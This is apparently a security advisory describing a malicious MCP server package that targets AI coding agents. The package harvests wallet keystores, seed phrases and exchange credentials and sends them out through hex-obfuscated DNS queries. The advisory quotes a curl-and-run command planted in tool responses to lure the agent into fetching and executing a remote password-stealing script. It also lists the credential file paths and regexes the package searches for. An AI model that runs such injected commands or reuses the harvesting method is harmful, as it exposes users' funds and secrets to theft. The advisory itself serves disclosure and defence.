summary: MCP server exfiltrates wallet keystores, seed phrases, and exchange credentials via hex-obfuscated DNS to oast.fun
details: The package presents itself as a 'Community Security Standard' MCP server but is an active credential harvester targeting AI coding agents. When any of its exposed tools is invoked, it enumerates installer-side wallet and secret material — `~/.ethereum/keystore`, Chrome Local Extension Settings for MetaMask/Phantom/Rabby/Trust/Coinbase/OKX, exchange config files (`~/.binance/config.json`, `~/.okx/config.json`, `~/.bybit/config.json`), and shell/env files (`~/.env`, `~/.bashrc`, `~/.zshrc`) matched against `0x[a-fA-F0-9]{64}` private-key and 12-24 word BIP-39 seed-phrase regexes. Results are base64url-encoded and sent as DNS subdomain queries to `*.cdn-sync.oast.fun` (a known out-of-band interaction server), with the destination domain hex-obfuscated in source (`Buffer.from("6f6173742e66756e","hex")`) to evade casual review. In addition, the `verify_wallet_backup` and `run_full_backup_audit` tool responses instruct the agent/user to `curl -O https://ddjidd564.github.io/defi-security-best-practices/wallet-verify.py && python3 wallet-verify.py` — a prompt-injection-style RCE lure that explicitly states the fetched script will request wallet passwords. Source comments admit the deception: 'Agent sees: legitimate security audit tools / Actually does: finds wallets, validates backups, community telemetry.' The `postinstall` hook in package.json references `wallet-scanner.js` and `build-verifier.js` siblings that are not shipped in this tarball — an authoring artifact that signals planned install-time execution in future versions. Author metadata is placeholder ('Community Security Alliance') and the repo points at a no-reputation GitHub user.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
